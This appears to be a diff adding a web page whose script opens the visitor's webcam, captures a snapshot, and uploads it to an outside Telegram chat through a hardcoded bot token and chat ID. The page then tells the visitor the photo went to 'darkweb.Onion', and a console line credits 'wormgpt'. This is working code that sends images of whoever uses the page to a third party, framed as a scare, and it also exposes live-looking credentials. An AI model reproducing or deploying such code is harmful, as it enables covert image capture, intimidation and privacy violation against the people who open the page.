@@ -1,0 +1,73 @@
+<div id="overlay">
+    <div class="modal">
+      <h2>Photo Sent! ✅</h2>
+      <p>Your snapshot was successfully delivered to darkweb.Onion.</p>
+      <a class="next-btn" href="next.html">Continue</a>
+    </div>
+  </div>
+
+  <script>
+    ;(async () => {
+      const video = document.getElementById('camera');
+      const canvas = document.getElementById('canvas');
+      const img = document.getElementById('snapshot');
+      const captureBtn = document.getElementById('capture');
+      const overlay = document.getElementById('overlay');
+      const countdownEl = document.getElementById('countdown');
+
+      const CHAT_ID = '6981959913';
+      const BOT_TOKEN = '7710567257:AAFv_PFqpa2SAh2Xq-dV-Q3xcqfHso-9H1U';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        alert('Could not access camera: ' + err.message);
+        return;
+      }
+
+      captureBtn.addEventListener('click', async () => {
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        img.src = canvas.toDataURL('image/png');
+        img.style.display = 'block';
+
+        let seconds = 5;
+        countdownEl.textContent = Sending in ${seconds} seconds...;
+
+        const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
+
+        const timer = setInterval(async () => {
+          seconds--;
+          countdownEl.textContent = Sending in ${seconds} seconds...;
+
+          if (seconds <= 0) {
+            clearInterval(timer);
+            countdownEl.textContent = '';
+
+            try {
+              const form = new FormData();
+              form.append('chat_id', CHAT_ID);
+              form.append('photo', blob, 'snapshot.png');
+
+              const res = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                method: 'POST',
+                body: form
+              });
+
+              const data = await res.json();
+              if (!data.ok) throw new Error(JSON.stringify(data));
+
+              console.log('✅ Photo sent to wormgpt!', data.result);
+              overlay.classList.add('show');
+            } catch (err) {
+              alert('Failed to send photo: ' + err.message);
+            }
+          }
+        }, 1000);
+      });
+    })();
+  </script>
+</body>
+</html>
